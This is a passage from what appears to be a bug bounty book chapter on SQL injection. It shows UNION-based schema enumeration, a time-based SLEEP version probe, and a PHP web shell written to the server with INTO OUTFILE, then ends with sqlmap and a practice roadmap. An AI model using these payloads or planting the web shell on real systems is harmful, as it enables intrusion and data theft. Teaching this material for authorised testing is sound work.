UNION SELECT 1, table_name FROM information_schema.tables</code></pre>
			<p><span epub:type="pagebreak" id="Page_202" title="202"/>And this one will show you the column names of the specified table. In this case, the query will list the columns in the Users table:</p>
			<pre><code>SELECT Title, Body FROM Emails
WHERE Username='vickie'
UNION SELECT 1, column_name FROM information_schema.columns
WHERE table_name = 'Users'</code></pre>
			<p>All of these techniques are possible during classic and blind attacks. You just need to find a different way to fit those commands into your constructed queries. For instance, you can determine a database’s version with a time-based technique like so:</p>
			<pre><code>SELECT * FROM PremiumUsers WHERE Id='2'
UNION SELECT IF(SUBSTR(@@version, 1, 1) = '1', SLEEP(10), 0); --</code></pre>
			<p>After you’ve learned about the database’s structure, start targeting certain tables to exfiltrate data that interests you.</p>
			<h3 id="h2-501546c11-0008">Gain a Web Shell</h3>
			<p>
				Another way to escalate SQL injections is to attempt to gain a web shell on the server. Let’s say we’re targeting a PHP application. The following piece of PHP code will take the request parameter named <code>cmd</code> and execute it as a system command:</p>
			<pre><code>&lt;? system($_REQUEST['cmd']); ?&gt;</code></pre>
			<p>
				You can use the SQL injection vulnerability to upload this PHP code to a location that you can access on the server by using <code>INTO OUTFILE</code>. For example, you can write the password of a nonexistent user and the PHP code <code>&lt;? system($_REQUEST['cmd']); ?&gt;</code> into a file located at <em>/var/www/html/shell.php</em> on the target server:</p>
			<pre><code>SELECT Password FROM Users WHERE Username='abc'
UNION SELECT "&lt;? system($_REQUEST['cmd']); ?&gt;"
INTO OUTFILE "/var/www/html/shell.php"</code></pre>
			<p>
				Since the password of the nonexistent user will be blank, you are essentially uploading the PHP script to the <em>shell.php</em> file. Then you can simply access your <em>shell.php</em> file and execute any command you wish:</p>
			<pre><code>http://www.example.com/shell.php?cmd=<var>COMMAND</var></code></pre>
			<h2 id="h1-501546c11-0005">Automating SQL Injections</h2>
			<p>
				Testing for SQL injection manually isn’t scalable. I recommend using tools to help you automate the entire process described in this chapter, from SQL injection discovery to exploitation. For example, sqlmap (<a class="LinkURL" href="http://sqlmap.org/">http://sqlmap.org/</a>) is a tool written in Python that automates the process of detecting and exploiting <span epub:type="pagebreak" id="Page_203" title="203"/>SQL injection vulnerabilities. A full tutorial of sqlmap is beyond the scope of this book, but you can find its documentation at <a class="LinkURL" href="https://github.com/sqlmapproject/sqlmap/wiki/">https://github.com/sqlmapproject/sqlmap/wiki/</a>.</p>
			<p>Before diving into automating your attacks with sqlmap, make sure you understand each of its techniques so you can optimize your attacks. Most of the techniques it uses are covered in this chapter. You can either use sqlmap as a standalone tool or integrate it with the testing proxy you’re using. For example, you can integrate sqlmap into Burp by installing the SQLiPy Burp plug-in.</p>
			<h2 id="h1-501546c11-0006">Finding Your First SQL Injection!</h2>
			<p>
				SQL injections are an exciting vulnerability to find and exploit, so dive into finding one on a practice application or bug bounty program. Since SQL injections are sometimes quite complex to exploit, start by attacking a deliberately vulnerable application like the Damn Vulnerable Web Application for practice, if you’d like. You can find it at <a class="LinkURL" href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk/</a>. Then follow this road map to start finding real SQL injection vulnerabilities in the wild:</p>
			<ol class="decimal">
				<li value="1">Map any of the application’s endpoints that take in user input.</li>
				<li value="2">Insert test payloads into these locations to discover whether they’re vulnerable to SQL injections. If the endpoint isn’t vulnerable to classic SQL injections, try inferential techniques instead.</li>
				<li value="3">Once you’ve confirmed that the endpoint is vulnerable to SQL injections, use different SQL injection queries to leak information from the database.</li>
				<li value="4">Escalate the issue. Figure out what data you can leak from the endpoint and whether you can achieve an authentication bypass. Be careful not to execute any actions that would damage the integrity of the target’s database, such as deleting user data or modifying the structure of the database.</li>
				<li value="5">Finally, draft up your first SQL injection report with an example payload that the security team can use to duplicate your results. Because SQL injections are quite technical to exploit most of the time, it’s a good idea to spend some time crafting an easy-to-understand proof of concept.</li>
			</ol>
		</section>
	</body>
</html>